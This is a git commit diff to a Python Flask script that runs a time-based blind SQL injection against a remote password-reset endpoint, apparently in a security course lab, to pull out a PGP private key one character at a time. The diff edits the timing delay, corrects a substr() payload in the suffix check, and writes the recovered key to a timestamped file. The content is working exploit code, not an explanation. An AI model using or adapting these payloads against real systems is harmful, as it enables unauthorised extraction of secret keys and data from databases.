d8261052f21b677c1f30129be8e1fa0fb486c1d8
gamba9911 <237609664+gamba9911@users.noreply.github.com>
2026-02-05 20:51:46 +0100

    file name by timestamp

--- app.py
+++ app.py
@@ -4,7 +4,8 @@ from statistics import median
 import requests
 from flask import Flask
 
-from datetime import date
+from datetime import datetime
+
 
 app = Flask(__name__)
 
@@ -12,7 +13,7 @@ API_URL = 'http://lbs-2026-00.askarov.net:3030/reset/'
 # API_URL = 'http://127.0.0.1:3000/reset'
 API_RUNS = 10
 THRESHOLD_SECONDS = 0.3
-COUNTER_DELAY = 10000000
+COUNTER_DELAY = 100000000
 PREFIX = "-----BEGIN PGP PRIVATE KEY BLOCK-----"
 SUFFIX = "-----END PGP PRIVATE KEY BLOCK-----"
 
@@ -82,7 +83,7 @@ def chunk_verification(normal_reponse_time):
     if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
         print("\n🚀 Last character check passed")
 
-    sql_payload = build_sql_payload(f"substr(key,{key_length - len(SUFFIX) + 1})=='{SUFFIX}'")
+    sql_payload = build_sql_payload(f"substr(key,{key_length - len(SUFFIX) + 1},{len(SUFFIX)})=='{SUFFIX}'")
     if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
         print("\n🚀 Suffix check passed")
 
@@ -94,7 +95,7 @@ def sql_injection_attack():
 
     chunk_verification(normal_reponse_time)
 
-    with open(date.today().__str__() + ".txt", "a") as f:
+    with open(datetime.now().__str__() + ".txt", "a") as f:
         # after loop each position index of the key to find the character
         key = ""
         for key_index in range(3508):
